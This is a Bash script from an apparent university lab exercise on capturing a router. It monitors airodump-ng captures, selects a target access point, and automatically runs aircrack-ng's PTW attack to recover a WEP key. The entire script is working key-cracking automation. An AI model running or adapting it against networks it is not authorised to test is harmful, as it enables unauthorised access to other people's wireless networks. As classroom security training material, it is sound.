#!/usr/bin/env bash
# 04_host_analyzer.sh - Native macOS M2 WEP Cryptanalysis & Capture Analyzer
# Laboratorio #10: Captura el Router (Ciencias de la Computación VIII)
# Offloads CPU-intensive aircrack-ng PTW statistical cracking to Apple Silicon M2

set -euo pipefail

CAPTURES_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/captures"
AIRCRACK_BIN="/opt/homebrew/bin/aircrack-ng"
if [[ ! -x "$AIRCRACK_BIN" ]]; then
    AIRCRACK_BIN="$(which aircrack-ng || true)"
fi

if [[ -z "$AIRCRACK_BIN" ]]; then
    echo "[-] ERROR: aircrack-ng no encontrado en macOS. Ejecute 'brew install aircrack-ng'."
    exit 1
fi

BSSID=""
MIN_IVS=5000
INTERVAL=3
OUTPUT_KEY_FILE="$CAPTURES_DIR/WEP_KEY_FOUND.txt"

show_usage() {
    cat <<EOF
Uso: $0 [opciones]
Opciones:
  -b, --bssid <MAC>       BSSID objetivo (opcional; si no se provee, se detecta de los CSV)
  -m, --min-ivs <num>     Cantidad mínima de IVs para iniciar aircrack-ng (por defecto: 5000)
  -i, --interval <sec>    Intervalo de verificación en segundos (por defecto: 3)
  -h, --help              Muestra esta ayuda
EOF
    exit 1
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -b|--bssid)
            BSSID="$2"
            shift 2
            ;;
        -m|--min-ivs)
            MIN_IVS="$2"
            shift 2
            ;;
        -i|--interval)
            INTERVAL="$2"
            shift 2
            ;;
        -h|--help)
            show_usage
            ;;
        *)
            echo "[-] Opción desconocida: $1"
            show_usage
            ;;
    esac
done

echo "================================================================="
echo "[*] INICIANDO 04_HOST_ANALYZER (APPLE SILICON M2 OFF-LOAD)"
echo "================================================================="
echo "[+] Directorio de capturas: $CAPTURES_DIR"
echo "[+] Binario aircrack-ng:    $AIRCRACK_BIN"
echo "[+] Umbral de activación:   $MIN_IVS IVs"
echo "-----------------------------------------------------------------"

LAST_CHECKED_IVS=0
LAST_CHECK_TIME=$(date +%s)
KEY_FOUND=0

while true; do
    # Check free disk space on macOS host
    HOST_AVAIL=$(df -h "$CAPTURES_DIR" | awk 'NR==2 {print $4}')

    # Find the latest .cap and .csv files in captures dir
    LATEST_CAP=$(ls -t "$CAPTURES_DIR"/*.cap 2>/dev/null | head -n 1 || true)
    LATEST_CSV=$(ls -t "$CAPTURES_DIR"/*.csv 2>/dev/null | head -n 1 || true)

    CURRENT_IVS=0
    DETECTED_BSSID=""
    DETECTED_ESSID=""
    DETECTED_CH=""

    if [[ -n "$LATEST_CSV" ]] && [[ -f "$LATEST_CSV" ]]; then
        # Parse airodump CSV summary
        # BSSID is col 1, Channel is col 4, Privacy is col 6, # IV is col 11, ESSID is col 14
        while IFS=, read -r c_bssid c_first c_last c_chan c_speed c_priv c_cipher c_auth c_pwr c_beac c_iv c_lan c_idlen c_essid c_key; do
            # Strip whitespace
            c_bssid=$(echo "$c_bssid" | tr -d ' "')
            c_priv=$(echo "${c_priv:-}" | tr -d ' "')
            c_iv=$(echo "${c_iv:-0}" | tr -d ' "')
            c_chan=$(echo "${c_chan:-}" | tr -d ' "')
            c_essid=$(echo "${c_essid:-}" | tr -d ' "\r')

            if [[ "$c_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                if [[ -z "$BSSID" ]] || [[ "${BSSID,,}" == "${c_bssid,,}" ]]; then
                    if [[ "$c_iv" =~ ^[0-9]+$ ]] && [[ "$c_iv" -gt "$CURRENT_IVS" ]]; then
                        CURRENT_IVS=$c_iv
                        DETECTED_BSSID=$c_bssid
                        DETECTED_ESSID=$c_essid
                        DETECTED_CH=$c_chan
                    fi
                fi
            fi
        done < "$LATEST_CSV"
    fi

    TARGET_BSSID="${BSSID:-$DETECTED_BSSID}"

    NOW=$(date +%s)
    ELAPSED=$((NOW - LAST_CHECK_TIME))
    VELOCITY=0
    if [[ "$ELAPSED" -gt 0 ]]; then
        DIFF_IVS=$((CURRENT_IVS - LAST_CHECKED_IVS))
        if [[ "$DIFF_IVS" -gt 0 ]]; then
            VELOCITY=$(bc <<< "scale=1; $DIFF_IVS / $ELAPSED" 2>/dev/null || echo 0)
        fi
    fi

    # Display status
    clear 2>/dev/null || true
    echo "================================================================="
    echo " 04_HOST_ANALYZER - RECONOCIMIENTO Y CRIPTOANÁLISIS WEP (M2)"
    echo "================================================================="
    echo "Archivo CAP:      ${LATEST_CAP:-Esperando capturas desde la VM...}"
    echo "Archivo CSV:      ${LATEST_CSV:-Esperando...}"
    echo "Objetivo BSSID:   ${TARGET_BSSID:-Detectando...}"
    echo "Objetivo ESSID:   ${DETECTED_ESSID:-N/A} (Canal ${DETECTED_CH:-N/A})"
    echo "IVs Capturados:   $CURRENT_IVS / $MIN_IVS requeridos"
    echo "Velocidad:        $VELOCITY IVs/seg"
    echo "Espacio Host:     $HOST_AVAIL libres"
    echo "-----------------------------------------------------------------"

    # Check if key was previously found
    if [[ -f "$OUTPUT_KEY_FILE" ]]; then
        echo -e "\033[92m[✔] ¡CLAVE WEP RECUPERADA CON ÉXITO!\033[0m"
        cat "$OUTPUT_KEY_FILE"
        echo "-----------------------------------------------------------------"
        echo "[*] Presione Ctrl+C para salir."
        sleep "$INTERVAL"
        continue
    fi

    # Trigger aircrack-ng when threshold reached and we have a target
    if [[ "$CURRENT_IVS" -ge "$MIN_IVS" ]] && [[ -n "$LATEST_CAP" ]] && [[ -n "$TARGET_BSSID" ]]; then
        echo -e "\033[93m[*] Umbral alcanzado ($CURRENT_IVS IVs). Ejecutando aircrack-ng PTW en CPU M2...\033[0m"
        
        # Execute PTW statistical attack with native aircrack-ng
        # -a 1: WEP attack
        # -b: target BSSID
        # -l: save key to file
        # -q: quiet output
        CRACK_OUT=$("$AIRCRACK_BIN" -a 1 -b "$TARGET_BSSID" -l "$OUTPUT_KEY_FILE" -q "$LATEST_CAP" 2>&1 || true)

        if [[ -f "$OUTPUT_KEY_FILE" ]] || grep -iq "KEY FOUND!" <<< "$CRACK_OUT"; then
            echo -e "\033[92m[✔] ¡CLAVE RECUPERADA POR AIRCRACK-NG!\033[0m"
            echo "$CRACK_OUT"
            KEY_FOUND=1
        else
            echo "[!] Aircrack-ng aún requiere más IVs para resolución estadística inequívoca."
            echo "    (Se reintentará automáticamente con los próximos paquetes sincronizados)."
        fi
    else
        echo "[*] Capturando tráfico... aircrack-ng se activará automáticamente al alcanzar $MIN_IVS IVs."
    fi

    LAST_CHECKED_IVS=$CURRENT_IVS
    LAST_CHECK_TIME=$NOW
    sleep "$INTERVAL"
done
